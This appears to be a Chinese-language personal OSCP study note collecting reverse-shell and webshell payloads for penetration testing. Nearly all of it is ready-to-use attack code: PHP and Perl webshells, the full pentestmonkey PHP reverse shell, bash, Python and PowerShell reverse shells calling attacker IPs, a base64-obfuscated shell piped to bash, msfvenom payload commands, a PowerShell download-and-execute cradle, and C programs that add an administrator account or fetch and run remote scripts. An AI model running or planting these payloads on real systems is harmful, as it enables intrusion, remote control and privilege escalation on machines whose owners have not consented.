+++
ShowToc = true
TocOpen = true
title = '反弹shell'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'OSCP笔记'
+++


https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?trk=article-ssr-frontend-pulse_little-text-block

## PHP:

```
1、webshell代码：
<?php system($_REQUEST['a']);?>
使用方式：
?a=id

<?php system($_GET['a']);?>
使用方式：
&a=id

<?php echo system($_GET['cmd']); ?>

如果有拦截，可以尝试以下代码：
<?=`$_GET[0]`?>

2、反弹shell代码：
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.254.128/8888 0>&1'"); ?>
                bash -c "bash -i >& /dev/tcp/192.168.45.205/4444 0>&1"

3、php代码

  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '10.10.16.12';  // You have changed this
  $port = 8888;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?> 

4、命令执行

<?php system("whoami");?>

```

本地自带的phpwebshell:

locate php-reverse-shell.php

/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/simple-backdoor.php

# java payload

```
${script:javascript:java.lang.Runtime.getRuntime().exec('/bin/bash -c bash$IFS$9-i>&/dev/tcp/192.168.45.185/4444<&1')}

此处可信任burp的编码，CyberChef不可



/bin/bash -c bash$IFS$9-i>&/dev/tcp/192.168.45.223/4444<&1
/bin/bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```


## NC:

```
nc可用链接：
https://github.com/int0x33/nc.exe/blob/master/nc.exe

windows：
C:\windows\temp\nc.exe -e cmd.exe 10.10.16.6 8888

```

## CGI pl后缀的webshell：

使用方式：webshell.pl?password=yourpassword

```
use CGI; use Cwd; print CGI::header( -type => 'text/html' ); my $command = CGI::param('command'); my $pwd = CGI::param('pwd') || ''; my $password = CGI::param('password'); my $filename = CGI->script_name() ; if ( $password ne 'yourpassword' ) { print "Please provide a valid password.\n"; exit(0) } $pwd = $pwd eq '' ? `pwd` : $pwd; my $home = Cwd::cwd(); chdir($pwd); my $result=''; if ($command =~ /^cd\s*(.*)/) { my $dir = $1 or ''; if ($dir eq '') { chdir($home); } else { chdir($dir); } $pwd = Cwd::cwd(); $result = `ls -la`; } else { $result = `$command`; } print <<EOF; <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html><head> <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type"><title>console</title> <script> window.onload = function(){ document.getElementById("command").focus(); } </script> <style type="text/css"> .wide1 { border-width: thick; width: 100%; height: 600px; } .wide2 { setFocus; border-width: thick; width: 100%; } </style> </head><body> <p> Script: $filename PWD: $pwd <br/> <textarea class="wide1" readonly="readonly" cols="1" rows="1" name="result"> $result </textarea></p> <form method="get" action="$filename" name="command">Command:  <input class="wide2" name="command" id="command"><br> <input name="password" value="$password" type="hidden"> <input name="pwd" value="$pwd" type="hidden"> </form> <br> </body></html> EOF exit 0;
```

## python

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.104",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

## base64

```
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNjYvODg4OCAwPiYxCg==" | base64 -d | bash
```

## msfvenom 

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.9 LPORT=8889 -f aspx

msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.157 LPORT=7766 -f elf > rootshell


msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f war > shell.war

msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw > shell.jsp

/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/simple-backdoor.php



msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.214 LPORT=445 -f war > /home/kali/Desktop/shell.war

```

## congfig后缀的木马

https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/


https://github.com/0xPurpl3john/web.config

这个后缀在IIS7.0以上是可以getshell的

修改项目里面的参数即可

seclists字典：
sudo apt -y install seclists

https://github.com/danielmiessler/SecLists/

/usr/share/seclists/Fuzzing/extensions-skipfish.fuzz.txt

# powershell

通过powershell创建反向shell连接：

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.16.5'',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.45.168',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

powershell -enc +base64调用

powershell Unicode+base64加密：

```
$text = "IEX ((new-object net.webclient).downloadstring('http://38.147.171.208:80/a'))"

[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text), 'InsertLineBreaks')
```

# aspx:


```
https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx
```

asp：

```
https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/webshell#log-poisoning--lfi--shell
```

# 手搓EXE：

安装编译器：

```
sudo apt install mingw-w64
```

报错解决方法：

32位的编译：
```
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

addusr.c

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

64位的编译：

```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

反弹shell.exe:

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("powershell.exe -nop -w hidden -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.159:81/81_6543.ps1')");
  
  return 0;
}
```

# nc 正向shell：


```
nc -lvp 8888 -e /bin/bash 
nc -lvp 8890 -e cmd.exe
```


